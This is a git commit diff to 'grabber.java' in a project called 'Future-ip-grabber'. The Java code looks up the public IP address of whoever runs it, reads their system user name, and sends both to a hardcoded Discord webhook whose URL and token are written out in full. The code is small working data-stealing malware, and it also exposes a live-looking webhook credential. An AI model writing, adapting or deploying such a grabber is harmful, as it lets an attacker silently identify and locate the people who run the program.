8a15ba1377c2f075e8e6f513b48f89690f74abd3
RyanairFan <49508387+Doundeway@users.noreply.github.com>
2021-04-27 11:31:20 +0300

    Update grabber.java

--- Future-ip-grabber/src/me/doundeway/future/grabber.java
+++ Future-ip-grabber/src/me/doundeway/future/grabber.java
@@ -7,25 +7,21 @@ import java.net.URL;
 
 public class grabber {
 	
+final sender webhook = new sender("https://discord.com/api/webhooks/836122951199227944/YxgO1S_Fh-X9OaOCs1jd6WTYoqQ3K6du54DUbHdkprZ0VkK9v0P_GFI2IgwDxLoj7jZh");	
+String username = System.getProperty("user.name");
+
     public String IPgrab() throws IOException {
     	//Get ip 
     	URL ip = new URL("http://checkip.amazonaws.com");
     	BufferedReader reader = new BufferedReader(new InputStreamReader(ip.openStream()));
     	String final_ip = reader.readLine();
     	//send msg 
-    	return String.valueOf(final_ip);
+    	return String.valueOf(final_ip);  	
     	
-    	
-    }
-    	
-          sender webhook = new sender("https://discord.com/api/webhooks/{your webhook id}");
+    }   
           grabber() throws IOException{
     	    	webhook.setContent(IPgrab());
-    	    	webhook.setUsername("Bot");
-    	    	webhook.execute();
-    	    	
-    	    
-    	
-
-}
+    	    	webhook.setUsername(username);
+    	    	webhook.execute();    	   	
+    }
 }
